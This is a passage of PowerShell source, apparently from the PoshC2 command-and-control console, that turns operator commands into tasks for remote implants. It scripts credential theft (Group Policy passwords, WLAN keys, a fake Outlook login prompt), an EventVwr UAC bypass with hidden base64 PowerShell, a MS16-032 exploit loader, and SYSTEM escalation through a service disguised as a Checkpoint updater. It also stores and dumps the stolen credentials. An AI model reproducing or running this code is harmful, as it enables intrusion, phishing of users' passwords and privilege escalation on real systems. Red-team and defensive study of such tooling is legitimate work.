                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Netstat -anp tcp; Netstat -anp udp; Net share; Ipconfig; Net view; Net users; Net localgroup administrators; Net accounts; Net accounts dom;"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Proxy; Invoke-allchecks; Get-MShotfixes"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Firewallrulesall | out-string -width 200"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Screenshot"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-GPPPassword"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-WmiObject -Class Win32_Product"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-ItemProperty -Path `"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" -Name CachedLogonsCount"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-ItemProperty -Path `"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters`""
                } | Out-Null
                
                $pscommand = "Get-RecentFiles; Get-WLANPass"

            }
            if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
            { 
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                CheckModuleLoaded "invoke-runaspayload.ps1" $psrandomuri
                $pscommand = $pscommand -replace 'invoke-runaspayload', ''
                $pscommand = "invoke-runaspayload $($pscommand)"
                
            }     
            if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
            { 
            if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"     
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = '$proxypayload = "'+$proxypayload+'"'
                } | Out-Null
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                CheckModuleLoaded "invoke-runasproxypayload.ps1" $psrandomuri
                $pscommand = $pscommand -replace 'invoke-runasproxypayload', ''
                $pscommand = "invoke-runasproxypayload $($pscommand)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }         
            if (($pscommand -eq 'StartAnotherImplantWithProxy') -or ($pscommand -eq 'saiwp'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $pscommand = 'start-process -windowstyle hidden cmd -args "/c $proxypayload"'
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('get-proxy')) 
            {
                $pscommand = 'Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"'
            }
            if ($pscommand.ToLower().StartsWith('createmacropayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.ToLower().StartsWith('invoke-daisychain')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createproxypayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.ToLower().StartsWith('upload-file')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createpayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand -eq 'cred-popper') 
            {
                $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
                write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
            }
            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))-or ($pscommand.ToLower().StartsWith('set-beacon'))) 
            {
                $pscommand = $pscommand -replace 'set-beacon ', ''
                $pscommand = $pscommand -replace 'sleep ', ''
                $pscommand = $pscommand -replace 'beacon ', ''
                $sleeptime = $pscommand
                if ($sleeptime.ToLower().Contains('m')) { 
                    $sleeptime = $sleeptime -replace 'm', ''
                    [int]$newsleep = $sleeptime 
                    [int]$newsleep = $newsleep * 60
                }
                elseif ($sleeptime.ToLower().Contains('h')) { 
                    $sleeptime = $sleeptime -replace 'h', ''
                    [int]$newsleep1 = $sleeptime 
                    [int]$newsleep2 = $newsleep1 * 60
                    [int]$newsleep = $newsleep2 * 60
                }
                elseif ($sleeptime.ToLower().Contains('s')) { 
                    $newsleep = $sleeptime -replace 's', ''
                } else {
                    $newsleep = $sleeptime
                }
                $pscommand = '$sleeptime = '+$newsleep
                $query = "UPDATE Implants SET Sleep=@Sleep WHERE RandomURI=@RandomURI"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    Sleep = $newsleep
                    RandomURI = $psrandomuri
                } | Out-Null
            }
            if (($pscommand.ToLower().StartsWith('turtle')) -or ($pscommand.ToLower().StartsWith('start-sleep'))) 
            {
                $pscommand = $pscommand -replace 'start-sleep ', ''
                $pscommand = $pscommand -replace 'turtle ', ''
                $sleeptime = $pscommand
                if ($sleeptime.ToLower().Contains('m')) { 
                    $sleeptime = $sleeptime -replace 'm', ''
                    [int]$newsleep = $sleeptime 
                    [int]$newsleep = $newsleep * 60
                }
                elseif ($sleeptime.ToLower().Contains('h')) { 
                    $sleeptime = $sleeptime -replace 'h', ''
                    [int]$newsleep1 = $sleeptime 
                    [int]$newsleep2 = $newsleep1 * 60
                    [int]$newsleep = $newsleep2 * 60
                }
                elseif ($sleeptime.ToLower().Contains('s')) { 
                    $newsleep = $sleeptime -replace 's', ''
                } else {
                    $newsleep = $sleeptime
                }
                $pscommand = 'Start-Sleep '+$newsleep
            }
            if ($pscommand.tolower().startswith('add-creds')){
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand -eq 'dump-creds'){
                $dbResult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Creds" -As PSObject
                Write-Output -InputObject $dbResult | ft -AutoSize | out-host
                $pscommand = $null
            }
            if ($pscommand -eq 'invoke-ms16-032')
            { 
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $pscommand = "LoadModule invoke-ms16-032.ps1"
            }
            if ($pscommand -eq 'invoke-ms16-032-proxypayload')
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand -eq 'invoke-uacbypassproxy')
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "ProxyPayload.ps1" $psrandomuri
                    CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                    CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                    $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
                    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                    $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`"" 
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }            
            }
            if ($pscommand -eq 'invoke-uacbypass')
            { 
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"  
                CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
                $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`""               
            } 
 
            if ($pscommand -eq 'Get-System') 
            {
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } | Out-Null

                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe start CPUpdater"
                } | Out-Null
                $pscommand = "sc.exe delete CPUpdater"

            }
            if ($pscommand -eq 'Get-System-WithProxy') 
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                    } | Out-Null

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe start CPUpdater"
                    } | Out-Null
                    $pscommand = "sc.exe delete CPUpdater"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }                   
            if ($pscommand -eq 'Hide-Implant') 
            {
                $pscommand = "Hide"
            }
            if ($pscommand -eq 'Unhide-Implant' ) {
               Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='Yes' WHERE RandomURI='$psrandomuri'" | Out-Null
            }
            if ($pscommand -eq 'output-to-html' ) {
                $allcreds = Invoke-SqliteQuery -Datasource $Database -Query "SELECT * FROM Creds" -As PSObject
                $CredsArray = @()
                foreach ($cred in $allcreds) {
                    $CredLog = New-object PSObject | Select  CredsID, Username, Password, Hash
                    $CredLog.CredsID = $cred.CredsID;
                    $Credlog.Username = $cred.Username;
                    $CredLog.Password = $cred.Password;
                    $CredLog.Hash = $cred.Hash;
                    $CredsArray += $CredLog
                }
                $CredsArray | ConvertTo-Html -title "<title>Credential List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Creds.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
               $ImplantsArray = @()
               foreach ($implantres in $allresults) {                  
                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
                    $ImplantLog.ImplantID = $implantres.ImplantID;
                    $ImplantLog.RandomURI = $implantres.RandomURI;
                    $ImplantLog.User = $implantres.User;
                    $ImplantLog.Hostname = $implantres.Hostname;
                    $ImplantLog.IPAddress = $implantres.IPAddress;
                    $ImplantLog.FirstSeen = $implantres.FirstSeen;
                    $ImplantLog.LastSeen = $implantres.LastSeen;
                    $ImplantLog.PID = $implantres.PID;
                    $ImplantLog.Arch = $implantres.Arch;
                    $ImplantLog.Domain = $implantres.Domain;
                    $ImplantLog.Sleep = $implantres.Sleep;
                    $ImplantsArray += $ImplantLog
               }

               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Implants.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
               $TasksArray = @()
               foreach ($task in $allresults) {                  
                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
                    $ImplantTask.TaskID = $task.CompletedTaskID;
                    $ImplantTask.Timestamp = $task.TaskID;
                    $ImplantTask.RandomURI = $task.RandomURI;
                    $ImplantTask.Command = $task.Command;
                    $ImplantTask.Output = $task.Output;
                    $TasksArray += $ImplantTask
               }
               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\ImplantTasks.html"
               $pscommand = $null
            }
            $pscommand
}
# command process loop
while($true)
{
    $global:command = Read-Host -Prompt $global:cmdlineinput

    if ($global:command)
    {
        $query = "INSERT INTO History (Command)
        VALUES (@Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
        Command = $global:command
        } | Out-Null
                              
        if ($global:implantid -eq "ALL")
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE Alive='Yes'" -As SingleValue
                foreach ($implanturisingular in $dbresults)
                {
                    $global:randomuri = $implanturisingular
                    $outputcmd = runcommand $global:command $global:randomuri 
                    if (($outputcmd -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$implanturisingular'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $implanturisingular
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
        elseif ($global:implantid.contains(",")){
            if ($global:command -eq 'back' -or $global:command -eq 'exit')
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                $global:implantid.split(",")| foreach {
                    $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$_'" -as SingleValue
                    $outputcmd = runcommand $global:command $global:randomuri
                    if (($global:command -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }            
        }
        else 
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                #write-host $global:command $global:randomuri
                $outputcmd = runcommand $global:command $global:randomuri
                if ($outputcmd -eq 'hide') 
                {
                    Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    $outputcmd = $null
                }  
                if ($outputcmd) {
                    $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
    }
}
}


